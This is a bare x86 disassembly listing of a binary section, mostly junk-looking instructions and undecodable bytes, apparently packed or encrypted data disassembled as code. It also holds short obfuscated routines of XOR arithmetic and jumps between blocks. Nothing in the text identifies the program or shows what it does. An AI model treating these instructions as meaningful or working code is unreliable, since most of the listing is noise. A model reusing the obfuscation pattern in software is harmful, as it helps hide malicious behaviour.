  40a83e:	jmp    0x40a87a
  40a840:	cmc    
  40a841:	sub    BYTE PTR [edi+0x15],ah
  40a844:	jmp    0x40a8c4
  40a846:	jle    0x40a8a4
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a84c
  40a84c:	inc    esi
  40a84d:	pop    esi
  40a84e:	repz sub DWORD PTR [esi-0x1d],ecx
  40a852:	mov    ds:0x75eb7bce,eax
  40a857:	mov    esp,0x51b3418
  40a85c:	mov    edx,0xb5eecc0e
  40a861:	aam    0x5
  40a863:	pcmpeqb mm4,QWORD PTR [edx]
  40a866:	iret   
  40a867:	dec    ecx
  40a868:	unpcklps xmm5,XMMWORD PTR [ebx]
  40a86b:	repnz push esi
  40a86d:	adc    eax,0xa42697cc
  40a872:	push   ebx
  40a873:	cli    
  40a874:	aad    0xfa
  40a876:	retf   
  40a877:	push   0xe
  40a879:	aaa    
  40a87a:	xlat   BYTE PTR ds:[ebx]
  40a87b:	scas   al,BYTE PTR es:[edi]
  40a87c:	xor    DWORD PTR ds:0x9014bfaa,ecx
  40a882:	sub    BYTE PTR [esi+ebx*8],0xfd
  40a886:	sar    DWORD PTR ds:0x5c360554,cl
  40a88c:	stos   DWORD PTR es:[edi],eax
  40a88d:	and    DWORD PTR [edi],0x2a
  40a890:	mov    DWORD PTR [ebp-0x10],eax
  40a893:	xchg   edx,eax
  40a894:	test   DWORD PTR [ecx-0xf4e4fea],ebp
  40a89a:	fwait
  40a89b:	jge    0x40a848
  40a89d:	dec    ebx
  40a89e:	dec    eax
  40a89f:	imul   ebx,DWORD PTR ds:0xd0881987,0xffffffe4
  40a8a6:	cld    
  40a8a7:	push   edx
  40a8a8:	call   0xdccf:0x935bc2b1
  40a8af:	and    BYTE PTR [esi-0x42],ch
  40a8b2:	push   ebp
  40a8b3:	mov    al,0x6b
  40a8b5:	(bad)  
  40a8b7:	pop    ecx
  40a8b8:	stc    
  40a8b9:	jno    0x40a8d0
  40a8bb:	sbb    BYTE PTR [eax],ah
  40a8bd:	add    DWORD PTR [ecx],ebp
  40a8bf:	push   ebp
  40a8c0:	dec    edx
  40a8c1:	aaa    
  40a8c2:	pop    edi
  40a8c3:	add    bh,dh
  40a8c5:	test   BYTE PTR [esi-0x4e],bl
  40a8c8:	cli    
  40a8c9:	hlt    
  40a8ca:	fld    DWORD PTR [edi+0x65b6b76a]
  40a8d0:	sahf   
  40a8d1:	fmul   QWORD PTR [edi+0xe]
  40a8d4:	repz dec esp
  40a8d6:	imul   ecx,ebp,0x34465340
  40a8dc:	ret    
  40a8dd:	xchg   ebp,eax
  40a8de:	mov    esp,0x1156bd06
  40a8e3:	push   esi
  40a8e4:	and    al,BYTE PTR ss:[edx]
  40a8e7:	call   0xb003f422
  40a8ec:	push   ebx
  40a8ed:	sbb    dh,dl
  40a8ef:	mov    ss,WORD PTR [edx]
  40a8f1:	cs (bad) 
  40a8f4:	in     eax,dx
  40a8f5:	sub    eax,DWORD PTR cs:[edx+0x32]
  40a8f9:	jb     0x40a89e
  40a8fb:	fucom  st(4)
  40a8fd:	adc    BYTE PTR [ebx+0x36251938],cl
  40a903:	and    eax,0x4ef166c5
  40a908:	mov    bl,0xa3
  40a90a:	mov    edx,0x9a162c32
  40a90f:	repz and al,0x34
  40a912:	hlt    
  40a913:	ficom  WORD PTR [edi]
  40a915:	ss nop
  40a917:	lods   al,BYTE PTR ds:[esi]
  40a918:	jle    0x40a8c1
  40a91a:	pushf  
  40a91b:	aad    0xbd
  40a91d:	in     eax,0x55
  40a91f:	fmul   QWORD PTR [edi+0x9627516]
  40a925:	lock add BYTE PTR [ebx+eax*8+0x6fe997ea],cl
  40a92d:	loop   0x40a902
  40a92f:	jbe    0x40a972
  40a931:	aas    
  40a932:	lahf   
  40a933:	cs cld 
  40a935:	xchg   esp,eax
  40a936:	or     al,0x19
  40a938:	xor    ah,BYTE PTR [ecx+0x71]
  40a93b:	add    ebx,esi
  40a93d:	out    0x12,eax
  40a93f:	push   ss
  40a940:	ficom  DWORD PTR [ecx+0x78]
  40a944:	sbb    al,0xe6
  40a946:	pop    edx
  40a947:	pop    esi
  40a948:	fwait
  40a949:	mov    al,0xd0
  40a94b:	pop    edx
  40a94c:	add    eax,0x78649295
  40a951:	aas    
  40a952:	add    eax,0x234eed26
  40a957:	push   es
  40a958:	mov    ah,0x1c
  40a95a:	ins    DWORD PTR es:[edi],dx
  40a95b:	inc    ecx
  40a95c:	push   eax
  40a95d:	(bad)  
  40a95e:	jg     0x40a94b
  40a960:	cmp    al,BYTE PTR [eax]
  40a962:	das    
  40a963:	pop    esp
  40a964:	inc    eax
  40a965:	repz mov eax,0x1a4905f5
  40a96b:	sar    al,1
  40a96d:	lock cmp DWORD PTR [edx+0x73],ebx
  40a971:	inc    esp
  40a972:	std    
  40a973:	shl    BYTE PTR [edi-0x68],0xc9
  40a977:	and    dl,BYTE PTR [edx]
  40a979:	add    esi,DWORD PTR [ebp+0x6bf74ac0]
  40a97f:	ds hlt 
  40a981:	test   DWORD PTR [edi-0x3e9ba2fa],esp
  40a987:	mov    ss,WORD PTR [ebp-0xd40a670]
  40a98d:	inc    ebx
  40a98e:	mov    al,ds:0x32dbc341
  40a993:	jo     0x40a93c
  40a995:	test   eax,0x82b3965a
  40a99a:	rcr    BYTE PTR [edx+0x6f808506],cl
  40a9a0:	push   edi
  40a9a1:	daa    
  40a9a2:	loopne 0x40a92d
  40a9a4:	dec    ecx
  40a9a5:	jb     0x40a942
  40a9a7:	(bad)  
  40a9a8:	in     al,dx
  40a9a9:	lahf   
  40a9aa:	repnz stc 
  40a9ac:	sbb    BYTE PTR [edx],0x1e
  40a9af:	mov    al,ds:0x3895dcbb
  40a9b4:	mov    ebp,0x497f5714
  40a9b9:	mov    edx,0x45f1f25e
  40a9be:	mov    bh,0xbb
  40a9c0:	sub    ebx,DWORD PTR [ebx-0x1b]
  40a9c3:	mov    edi,0xabfb4b06
  40a9c8:	popa   
  40a9c9:	pop    edi
  40a9ca:	or     bl,BYTE PTR [esi+0x8004445]
  40a9d0:	and    DWORD PTR [esi+eiz*2],esp
  40a9d3:	inc    esi
  40a9d4:	and    BYTE PTR [ebx+0x1b79b2a4],al
  40a9da:	or     ecx,DWORD PTR [edx-0x64393f31]
  40a9e0:	loop   0x40aa4a
  40a9e2:	cmp    BYTE PTR [ebp+0x31477769],dh
  40a9e8:	mov    DWORD PTR [ebp+0x14],esi
  40a9eb:	popf   
  40a9ec:	shl    DWORD PTR [edi],cl
  40a9ee:	dec    esi
  40a9ef:	shr    DWORD PTR [ebx],0x32
  40a9f2:	dec    ebx
  40a9f3:	push   edi
  40a9f4:	icebp  
  40a9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f6:	mov    edi,0xe7744206
  40a9fb:	push   ebp
  40a9fc:	inc    esi
  40a9fd:	jns    0x40aa09
  40a9ff:	add    al,0xe9
  40aa01:	retf   0x1a82
  40aa04:	ret    
  40aa05:	imul   ecx,DWORD PTR [eax-0x60106912],0xffffff9b
  40aa0c:	jmp    0x22c4:0xdbab03a8
  40aa13:	outs   dx,DWORD PTR ds:[esi]
  40aa14:	ja     0x40aa1c
  40aa16:	inc    edx
  40aa17:	pop    edi
  40aa18:	fsubr  DWORD PTR [ecx]
  40aa1a:	in     eax,0x2b
  40aa1c:	pusha  
  40aa1d:	sub    esp,DWORD PTR [edi+0x25]
  40aa20:	sub    bl,BYTE PTR [ebx]
  40aa22:	or     al,0x5a
  40aa24:	push   ss
  40aa25:	xchg   BYTE PTR [edx+0x59],bl
  40aa28:	ret    
  40aa29:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40aa30:	or     edx,ecx
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e762,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43055a,0x42e762
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e75a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430556,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	lock in al,0x96
  40aaa0:	mov    al,ds:0x7e7eed73
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aa47
  40aaaa:	mov    ds,esi
  40aaac:	pop    es
  40aaad:	loope  0x40ab1d
  40aaaf:	out    dx,eax
  40aab0:	(bad)  
  40aab1:	retf   
  40aab2:	call   0x82a8:0xf17df251
  40aab9:	sub    edi,edi
  40aabb:	frstor [edi+0x71]
  40aabe:	push   esp
  40aabf:	sbb    ebx,0xa86ddcd5
  40aac5:	mov    esp,0x8caa7c80
  40aaca:	sub    bl,ch
  40aacc:	out    0xb7,al
  40aace:	sbb    dl,0x5a
  40aad1:	std    
  40aad2:	mov    ebp,0xb0f76da8
  40aad7:	jb     0x40aade
  40aad9:	ret    0x7610
  40aadc:	mov    dh,0x51
  40aade:	jl     0x40ab5c
  40aae0:	loop   0x40aac6
  40aae2:	adc    BYTE PTR [ebx],ah
  40aae4:	repnz mov bl,0xbc
  40aae7:	fdiv   st(6),st
  40aae9:	mov    edi,0xeda603ce
  40aaee:	xchg   ebx,eax
  40aaef:	and    al,0x8b
  40aaf1:	pop    edx
  40aaf2:	push   0xc5291e23
  40aaf7:	cdq    
  40aaf8:	or     ch,ch
  40aafa:	aaa    
  40aafb:	hlt    
  40aafc:	xlat   BYTE PTR es:[ebx]
  40aafe:	sbb    ebx,DWORD PTR [esi+0x43]
  40ab01:	test   eax,0x61efa80f
  40ab06:	and    eax,0x96ed5c2a
  40ab0b:	xor    eax,0x76b296b9
  40ab10:	adc    esi,eax
  40ab12:	cwde   
  40ab13:	call   0xff44:0x51a8cb29
  40ab1a:	mov    ch,0xf6
  40ab1c:	pop    esp
  40ab1d:	loopne 0x40aaaf
  40ab1f:	das    
  40ab20:	(bad)  
  40ab22:	retf   0x2ca
  40ab25:	(bad)  
  40ab27:	icebp  
  40ab28:	test   al,0xe9
  40ab2a:	leave  
  40ab2b:	ja     0x40aaf0
  40ab2d:	popa   
  40ab2e:	int    0x14
  40ab30:	mov    ebp,0xfe5cf6d0
  40ab36:	pop    edi
  40ab38:	pop    ebx
  40ab39:	outs   dx,BYTE PTR ds:[esi]
  40ab3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3b:	adc    bl,BYTE PTR ds:0xf6642eb9
  40ab41:	outs   dx,BYTE PTR ds:[esi]
  40ab42:	pop    ebx
  40ab43:	mov    dl,0xe7
  40ab45:	pop    ebx
  40ab46:	push   ebp
  40ab47:	mov    fs,WORD PTR [edx+eax*4+0x700833b5]
  40ab4e:	push   0x15e9f81c
  40ab53:	call   0x531c:0x475ce0f3
  40ab5a:	mov    edx,0x6145f970
  40ab5f:	push   edi
  40ab60:	sbb    ebx,esi
  40ab62:	sbb    DWORD PTR [edi],edx
  40ab64:	sub    ebp,esi
  40ab66:	in     eax,0xe7
  40ab68:	shl    BYTE PTR [edx-0x23],cl
  40ab6b:	jecxz  0x40ab93
  40ab6d:	sbb    BYTE PTR [ecx+edi*8],ch
  40ab70:	xor    eax,0x9392928d
  40ab75:	pop    DWORD PTR [eax+ebp*2+0x6a7f088b]
  40ab7c:	mul    DWORD PTR [edx]
  40ab7e:	mov    ch,0x33
  40ab80:	jns    0x40ab31
  40ab82:	sbb    ah,bl
  40ab84:	mov    dl,0xe0
  40ab86:	imul   ebp,DWORD PTR [eax-0x77],0x7ee66ad4
  40ab8d:	sbb    al,0x19
  40ab8f:	pop    edi
  40ab90:	shl    DWORD PTR [esi],cl
  40ab92:	sti    
  40ab93:	and    al,BYTE PTR [esi-0x30768fc6]
  40ab99:	repnz xor al,0x45
  40ab9c:	lock inc ebx
  40ab9e:	sbb    ebx,DWORD PTR [ebp-0x31]
  40aba1:	mov    WORD PTR [eax+0x39496fab],fs
  40aba7:	inc    ebp
  40aba8:	cli    
  40aba9:	ror    DWORD PTR ds:0x27ac47b,1
  40abaf:	or     esp,edi
  40abb1:	out    dx,eax
  40abb2:	lods   al,BYTE PTR ds:[esi]
  40abb3:	push   ebp
  40abb4:	mov    bh,0xae
  40abb6:	addr16 in al,dx
  40abb8:	or     dl,al
  40abba:	lea    esi,[eax-0x2b]
  40abbd:	(bad)  
  40abbe:	mov    edx,0x1d48eccb
  40abc3:	sub    edx,DWORD PTR [eax]
  40abc5:	adc    DWORD PTR [ebp+0x78c8cc7f],esi
  40abcb:	push   ss
  40abcc:	and    ah,cl
  40abce:	dec    esi
  40abcf:	bound  ecx,QWORD PTR [edx]
  40abd1:	and    ebx,esi
  40abd3:	jae    0x40ab7e
  40abd5:	jg     0x40ab78
  40abd7:	mov    ch,0x94
  40abd9:	xor    al,BYTE PTR [edx-0x76]
  40abdc:	xor    bh,bl
  40abde:	enter  0x7335,0xd6
  40abe2:	(bad)  
  40abe3:	loopne 0x40abd7
  40abe5:	in     al,dx
  40abe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abe7:	inc    ecx
  40abe8:	pop    ebp
  40abe9:	daa    
  40abea:	push   ecx
  40abec:	push   ebp
  40abed:	fwait
  40abee:	arpl   WORD PTR ds:0x19cc,si
  40abf3:	stos   DWORD PTR es:[edi],eax
  40abf4:	mov    ds,esp
  40abf6:	mov    edx,0x76887c00
  40abfb:	mov    esp,eax
  40abfd:	out    0x78,al
  40abff:	repnz push esi
  40ac01:	mov    ebx,0x9753bb18
  40ac06:	sahf   
  40ac07:	xchg   ebx,eax
  40ac08:	inc    ebx
  40ac09:	and    DWORD PTR [edi+0x1f473402],edx
  40ac0f:	pop    ds
  40ac10:	mov    ebx,0x9bc408a1
  40ac15:	mov    ch,0xcf
  40ac17:	jno    0x40abfc
  40ac19:	xor    al,0x53
  40ac1b:	cld    
  40ac1c:	scas   eax,DWORD PTR es:[edi]
  40ac1d:	jl     0x40ac19
  40ac1f:	out    dx,eax
  40ac20:	js     0x40ac82
  40ac22:	gs dec eax
  40ac24:	pextrw esp,mm0,0x98
  40ac28:	mov    al,0xc8
  40ac2a:	adc    BYTE PTR [ebp+0x464d1c3d],dl
  40ac30:	popf   
  40ac31:	setb   BYTE PTR [esi+0x311f1fad]
  40ac38:	mov    WORD PTR [esi-0x6bef5453],ds
  40ac3e:	push   0xb508615e
  40ac43:	rcl    BYTE PTR [esp+eax*8-0x6f],0xa2
  40ac48:	rcr    cl,0xd4
  40ac4b:	xor    ah,BYTE PTR [edx-0x48fe2ac3]
  40ac51:	push   ecx
  40ac52:	sbb    BYTE PTR [ebp-0x79],cl
  40ac55:	loope  0x40ac4a
  40ac57:	adc    al,0x24
  40ac59:	push   ds
  40ac5a:	call   0x2d79c34b
  40ac5f:	enter  0xb51a,0xf9
  40ac63:	(bad)
  40ac67:	dec    ebx
  40ac68:	mov    ds:0xbfb13bb8,al
  40ac6d:	mov    cl,0x18
  40ac6f:	push   ds
  40ac70:	sbb    al,0xd6
  40ac72:	test   DWORD PTR [ebx+0x3c1e3919],0x6984c9f7
  40ac7c:	iret   
  40ac7d:	dec    edi
  40ac7e:	push   ds
  40ac7f:	push   ds
  40ac80:	sub    BYTE PTR ds:0x1cabaee,bl
  40ac86:	mov    esi,DWORD PTR [ebx]
  40ac88:	ret    0xf233
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xe0d44102
  40aca1:	mov    edi,0x7e7eee51
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40acbb
  40acab:	in     eax,dx
  40acac:	mov    ch,0x4c
  40acae:	mov    bh,0xfc
  40acb0:	mov    bl,0x2e
  40acb2:	xor    BYTE PTR [esi-0x8a17b3f],bl
  40acb8:	inc    edx
  40acb9:	pop    ebp
  40acba:	add    BYTE PTR [ecx-0x5ee64888],bh
  40acc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acc1:	xlat   BYTE PTR ds:[ebx]
  40acc2:	mov    eax,0x93de37bb
  40acc7:	add    al,0x95
  40acc9:	or     DWORD PTR [esi+ecx*8-0x743a71fa],0xa415864f
  40acd4:	js     0x40ad53
  40acd6:	cmp    bl,cl
  40acd8:	es test esp,0xda1feda1
  40acdf:	(bad)  
  40ace0:	ffree  st(7)
  40ace2:	dec    esi
  40ace3:	jmp    0xec95b9a1
  40ace8:	bound  ebx,QWORD PTR [eax-0x68]
  40aceb:	xchg   ebp,eax
  40acec:	(bad)  
  40aced:	jecxz  0x40ac9c
  40acef:	out    dx,al
  40acf0:	pop    esp
  40acf1:	cmp    cl,0x3e
  40acf4:	fnsave [edx+0x23]
  40acf7:	xchg   BYTE PTR [eax],bl
  40acf9:	pop    es
  40acfa:	add    eax,0x9a9894df
  40acff:	daa    
  40ad00:	pop    esp
  40ad01:	pusha  
  40ad02:	dec    eax
  40ad03:	call   0x5676a1e6
  40ad08:	or     BYTE PTR [ebp-0x5],0x50
  40ad0c:	jle    0x40ad84
  40ad0e:	push   0x75
  40ad10:	ror    BYTE PTR [ebx],cl
  40ad12:	hlt    
  40ad13:	push   ebx
  40ad14:	shl    dh,0x7f
  40ad17:	jp     0x40ad2e
  40ad19:	fbld   TBYTE PTR [esi+edi*4]
  40ad1c:	or     eax,0x970f19ba
  40ad21:	mov    edx,0xdbf6743
  40ad26:	xor    DWORD PTR [ebp+0x7c7e0ab9],esp
  40ad2c:	mov    edx,0x6ec0c418
  40ad31:	jmp    0xd140:0x51dce734
  40ad38:	or     eax,0x7aa90c25
  40ad3d:	call   0xab164929
  40ad42:	mov    eax,0x7976dd05
  40ad47:	adc    BYTE PTR [ebp+0x63],cl
  40ad4a:	mov    DWORD PTR [esi-0x4975c807],ecx
  40ad50:	popf   
  40ad51:	ins    DWORD PTR es:[edi],dx
  40ad52:	push   0x3239aefe
  40ad57:	jno    0x40adb2
  40ad59:	fld    DWORD PTR [edx+0x1e]
  40ad5c:	and    ebx,edi
  40ad5e:	xchg   esp,eax
  40ad5f:	outs   dx,BYTE PTR ds:[esi]
  40ad60:	nop
  40ad61:	in     eax,0x7c
  40ad63:	daa    
  40ad64:	mov    eax,ds:0x7991d3fd
  40ad69:	ins    BYTE PTR es:[edi],dx
  40ad6a:	out    0xbb,al
  40ad6c:	mov    esi,DWORD PTR [esi-0xf]
  40ad6f:	cwde   
  40ad70:	pushf  
  40ad71:	pop    eax
  40ad72:	leave  
  40ad73:	sahf   
  40ad74:	outs   dx,BYTE PTR ds:[esi]
  40ad75:	mov    edx,0xb356555b
  40ad7a:	enter  0x6405,0xbc
  40ad7e:	clc    
  40ad7f:	add    eax,0xbadafc12
  40ad84:	mov    ebx,DWORD PTR [edi]
  40ad86:	sti    
  40ad87:	mov    BYTE PTR [edi],dh
  40ad89:	xor    al,0xb8
  40ad8b:	fisub  WORD PTR [edi]
  40ad8d:	xor    DWORD PTR [edx+0x4],eax
  40ad90:	(bad)  
  40ad91:	jnp    0x40ad7d
  40ad93:	dec    esp
  40ad94:	sbb    al,BYTE PTR [esi+eiz*2-0x42]
  40ad98:	rcr    DWORD PTR [edi+ecx*4],0x3a
  40ad9c:	(bad)  
  40ad9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad9f:	(bad)  
  40ada0:	mov    esp,0x6ce33018
  40ada5:	sbb    BYTE PTR [ebx-0x70],bh
  40ada8:	mov    ch,0xe8
  40adaa:	jge    0x40ae10
  40adac:	stc    
  40adad:	or     BYTE PTR [ebx+edi*1-0x12],0x56
  40adb2:	dec    edi
  40adb3:	sahf   
  40adb4:	mov    gs,WORD PTR [ebx+0x5b]
  40adb7:	lea    eax,[ebx-0x2a]
  40adba:	aaa    
  40adbb:	stos   DWORD PTR es:[edi],eax
  40adbc:	and    BYTE PTR ds:[ebp-0x5be51bb4],ch
  40adc3:	push   0x4a
  40adc5:	call   0x31f4b930
  40adca:	push   ss
  40adcb:	xchg   edi,eax
  40adcc:	mov    bl,0x26
  40adce:	mov    edx,0xdbbd91eb
  40add3:	outs   dx,BYTE PTR ds:[esi]
  40add4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add6:	mov    al,ds:0xe950e2fa
  40addb:	mov    DWORD PTR [ebp+0x3e],eax
  40adde:	xor    eax,ebp
  40ade0:	stos   DWORD PTR es:[edi],eax
  40ade1:	imul   edi,DWORD PTR [eax+0x24],0xffffff92
  40ade5:	jae    0x40ae20
  40ade7:	lea    edi,ds:0x16c10861
  40aded:	hlt    
  40adee:	sub    bl,BYTE PTR [ecx+edx*2]
  40adf1:	dec    esi
  40adf2:	or     eax,0xc49b0db5
  40adf7:	repz cwde 
  40adf9:	out    0xf0,al
  40adfb:	pusha  
  40adfc:	push   0xffffffce
  40adfe:	cs repnz loopne 0x40ae21
  40ae02:	cmp    DWORD PTR ss:[ebx*4+0x2d112795],esi
  40ae0a:	sub    esi,ebx
  40ae0c:	mov    esp,0xe5cd69cb
  40ae11:	ret    0x9dd6
  40ae14:	jbe    0x40adde
  40ae16:	mov    al,BYTE PTR [ecx]
  40ae18:	mov    ds:0xbd04dd43,al
  40ae1d:	pop    esi
  40ae1e:	sub    eax,0x77e80304
  40ae23:	fwait
  40ae24:	bound  ebp,QWORD PTR [ebx]
  40ae26:	xchg   edx,eax
  40ae27:	mov    ds:0x40d52225,al
  40ae2c:	lods   eax,DWORD PTR ds:[esi]
  40ae2d:	fistp  WORD PTR [esi+0x1f]
  40ae30:	lea    edi,[ebx+eax*2-0x75]
  40ae34:	frstor [eax*8-0x583d762a]
  40ae3b:	mov    al,0xf3
  40ae3d:	xchg   esi,eax
  40ae3e:	cmovp  esi,DWORD PTR [esi+0x7a]
  40ae42:	(bad)  
  40ae43:	cmp    edi,DWORD PTR [eax-0xf09ce3c]
  40ae49:	mov    bh,0x4f
  40ae4b:	(bad)  
  40ae4c:	retf   
  40ae4d:	ins    BYTE PTR es:[edi],dx
  40ae4e:	lds    ebp,FWORD PTR [ebx-0x7d]
  40ae51:	dec    esi
  40ae52:	(bad)  
  40ae53:	es inc edi
  40ae55:	sbb    DWORD PTR ds:0xe815e2a5,0xffffffe9
  40ae5c:	popa   
  40ae5d:	push   edi
  40ae5e:	mov    fs,ebp
  40ae60:	xor    eax,0xf9eb55ae
  40ae65:	call   0x8537e55d
  40ae6a:	jp     0x40ae21
  40ae6c:	in     al,dx
  40ae6d:	repnz (bad) 
  40ae6f:	xchg   edi,eax
  40ae70:	jb     0x40aec5
  40ae72:	pushf  
  40ae73:	fstp   QWORD PTR [ecx]
  40ae75:	fs mov ecx,0x546479aa
  40ae7b:	in     eax,dx
  40ae7c:	nop
  40ae7d:	dec    eax
  40ae7e:	push   0xdf894c75
  40ae83:	fs inc edi
  40ae85:	dec    dl
  40ae87:	dec    ebx
  40ae88:	add    esi,ecx
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock stc 
  40aeb3:	mov    bh,0x9f
  40aeb5:	mov    BYTE PTR [edi+0x5c7e7ee0],bh
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aeb2
  40aebf:	loop   0x40ae7a
  40aec1:	shl    DWORD PTR [edi-0x31],1
  40aec4:	or     al,0xbd
  40aec6:	out    0x2d,al
  40aec8:	(bad)  
  40aec9:	sahf   
  40aeca:	ja     0x40ae90
  40aecc:	mov    edx,0xfb77a6f6
  40aed1:	and    al,0x38
  40aed3:	loopne 0x40aeac
  40aed5:	sub    cl,BYTE PTR [esp+edx*1]
  40aed8:	mov    ch,0xb6
  40aeda:	mov    esp,0x2c41565c
  40aedf:	les    esp,FWORD PTR [ecx-0x20]
  40aee2:	dec    esi
  40aee3:	mov    eax,ds:0x2c9486cc
  40aee8:	aad    0xd5
  40aeea:	in     al,0xae
  40aeec:	push   es
  40aeed:	(bad)  
  40aeee:	fs push cs
  40aef0:	test   al,0xdf
  40aef2:	jbe    0x40aeb0
  40aef4:	fist   DWORD PTR [ebx]
  40aef6:	cmp    al,0xda
  40aef8:	jmp    0x31ea:0xf3543418
  40aeff:	fmul   QWORD PTR [esp+ebx*2-0x6d0fd642]
  40af06:	dec    ecx
  40af07:	aas    
  40af08:	inc    esp
  40af09:	and    dl,BYTE PTR [esi+0x16990df4]
  40af0f:	jnp    0x40af06
  40af11:	js     0x40af54
  40af13:	mov    al,ds:0x3845516
  40af18:	sahf   
  40af19:	es push edi
  40af1b:	(bad)  
  40af1c:	aad    0xb2
  40af1e:	aaa    
  40af1f:	mov    al,0xb6
  40af21:	jp     0x40af97
  40af23:	or     BYTE PTR [edi+ecx*8-0x64269d04],dl
  40af2a:	imul   ecx,DWORD PTR [ecx-0x46],0x79
  40af2e:	lods   eax,DWORD PTR ds:[esi]
  40af2f:	pushf  
  40af30:	aam    0x19
  40af32:	dec    esi
  40af33:	xchg   edi,eax
  40af34:	mov    gs,WORD PTR [esi-0x172f0397]
  40af3a:	dec    edx
  40af3b:	cmc    
  40af3c:	mov    eax,0x78e2eccf
  40af41:	repz out dx,al
  40af43:	out    0x23,al
  40af45:	dec    ebx
  40af46:	xlat   BYTE PTR ds:[ebx]
  40af47:	lea    edx,[edi]
  40af49:	loopne 0x40af00
  40af4b:	push   ebp
  40af4c:	push   ds
  40af4d:	sti    
  40af4e:	dec    esp
  40af4f:	xchg   esp,eax
  40af50:	out    0xde,al
  40af52:	inc    eax
  40af53:	and    al,0xed
  40af55:	sub    ebp,esi
  40af57:	pop    ecx
  40af58:	(bad)  
  40af59:	xchg   ebp,eax
  40af5a:	adc    eax,0x2167d1c4
  40af5f:	aam    0x12
  40af61:	pop    edx
  40af62:	jnp    0x40af2a
  40af64:	enter  0xa3b2,0xf2
  40af68:	mov    dh,0x7e
  40af6a:	mov    ebx,0x8729e943
  40af6f:	mov    bh,0xac
  40af71:	sub    eax,0xac5e91cc
  40af76:	int    0xe7
  40af78:	and    DWORD PTR [edi-0x59],esp
  40af7b:	out    0xe7,eax
  40af7d:	pop    edx
  40af7e:	inc    ax
  40af80:	loopne 0x40af22
  40af82:	dec    eax
  40af83:	imul   edi,edi,0x14
  40af86:	jg     0x40afbe
  40af88:	dec    eax
  40af89:	inc    ebx
  40af8a:	mov    edi,0xfb72eb22
  40af8f:	ret    0xa66a
  40af92:	daa    
  40af93:	dec    eax
  40af94:	mov    dh,0x58
  40af96:	dec    esp
  40af98:	lods   eax,DWORD PTR ds:[esi]
  40af99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af9b:	dec    edi
  40af9c:	fmul   QWORD PTR [eax+ecx*2-0x46f61ec7]
  40afa3:	inc    edx
  40afa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afa5:	xor    BYTE PTR [ebp+0x31c98b01],0x6b
  40afac:	test   bh,0x6
  40afaf:	retf   0xfb7
  40afb2:	and    eax,0x1bfc32db
  40afb7:	repnz arpl WORD PTR [ebp+0x22660b34],bp
  40afbe:	fisub  WORD PTR [ecx+ebx*2-0x179e6536]
  40afc6:	sub    ebp,DWORD PTR [edx-0x15]
  40afc9:	aas    
  40afca:	adc    al,0xac
  40afcc:	iret   
  40afcd:	nop
  40afce:	std    
  40afcf:	inc    edi
  40afd0:	push   esi
  40afd1:	cmp    DWORD PTR [edx-0x5ab74c65],ecx
  40afd7:	mov    ah,0x7d
  40afd9:	xor    al,0xa4
  40afdb:	lock jno 0x40afe1
  40afde:	mov    esp,0xb2e3339b
  40afe3:	lahf   
  40afe4:	stos   BYTE PTR es:[edi],al
  40afe5:	sbb    eax,0x3276bcff
  40afea:	mov    ecx,0x3192be79
  40afef:	imul   ecx,DWORD PTR [ecx],0x6f
  40aff2:	lock test BYTE PTR [edx],ch
  40aff5:	fist   WORD PTR [ebx]
  40aff7:	out    0x5f,al
  40aff9:	(bad)  
  40affa:	cmp    bl,BYTE PTR [esi]
  40affc:	out    0xd4,al
  40affe:	jne    0x40afb6
